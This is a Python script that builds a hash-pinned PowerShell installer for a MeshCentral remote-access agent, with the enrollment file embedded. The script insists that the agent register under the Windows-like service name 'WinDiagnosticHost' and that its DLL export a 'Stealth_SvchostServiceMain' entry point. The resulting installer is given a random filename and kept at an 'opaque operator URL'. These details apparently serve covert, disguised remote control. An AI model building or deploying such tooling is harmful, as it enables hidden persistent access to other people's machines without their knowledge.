#!/usr/bin/env python3
"""Build a hash-pinned, Office-scoped PowerShell recovery script.

The generated script embeds the provisioning file and is enrollment material.
Keep it under ignored artifacts and publish only at an opaque operator URL.
"""
import argparse
import base64
import hashlib
import json
import os
from pathlib import Path
import secrets
import sys
from urllib.parse import urlparse


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
os.environ.setdefault("MESHCENTRAL_SERVER", "local-package-validation.invalid")
import deploy  # noqa: E402


def sha256(data):
    return hashlib.sha256(data).hexdigest().upper()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent-file", type=Path, required=True)
    parser.add_argument("--dll-file", type=Path, required=True)
    parser.add_argument("--msh-file", type=Path, required=True)
    parser.add_argument("--agent-url", required=True)
    parser.add_argument("--output-dir", type=Path, default=ROOT / "artifacts/deployment/recovery")
    args = parser.parse_args()

    url = urlparse(args.agent_url)
    if url.scheme != "https" or not url.netloc or "'" in args.agent_url:
        parser.error("--agent-url must be an HTTPS URL without single quotes")
    agent = args.agent_file.read_bytes()
    dll = args.dll_file.read_bytes()
    msh = args.msh_file.read_bytes()
    if deploy.extract_embedded_service_bundle(args.agent_file) != dll:
        parser.error("agent EXE does not embed the selected DLL")
    if b"MeshID=" not in msh or b"MeshServer=" not in msh or b"meshServiceName=WinDiagnosticHost" not in msh:
        parser.error("provisioning file is not the expected WinDiagnosticHost enrollment")
    for export in (b"MeshLifecycleHostW", b"MeshServiceHostW", b"Stealth_SvchostServiceMain"):
        if not deploy.has_service_host_export(args.dll_file, export):
            parser.error(f"DLL lacks {export.decode()} export")

    template = (ROOT / "tools/Install-MeshAgent.Recovery.ps1").read_text(encoding="utf-8")
    replacements = {
        "__AGENT_URL__": args.agent_url,
        "__AGENT_SHA256__": sha256(agent),
        "__DLL_SHA256__": sha256(dll),
        "__MSH_SHA256__": sha256(msh),
        "__MSH_BASE64__": base64.b64encode(msh).decode("ascii"),
    }
    for marker, value in replacements.items():
        if template.count(marker) != 1:
            parser.error(f"template marker count is wrong for {marker}")
        template = template.replace(marker, value)
    args.output_dir.mkdir(parents=True, exist_ok=True)
    target = args.output_dir / f"install-{secrets.token_hex(16)}.ps1"
    target.write_text(template, encoding="utf-8", newline="\n")
    print(json.dumps({
        "script": str(target),
        "script_sha256": sha256(target.read_bytes()),
        "agent_sha256": replacements["__AGENT_SHA256__"],
        "dll_sha256": replacements["__DLL_SHA256__"],
        "msh_sha256": replacements["__MSH_SHA256__"],
    }, indent=2))


if __name__ == "__main__":
    main()
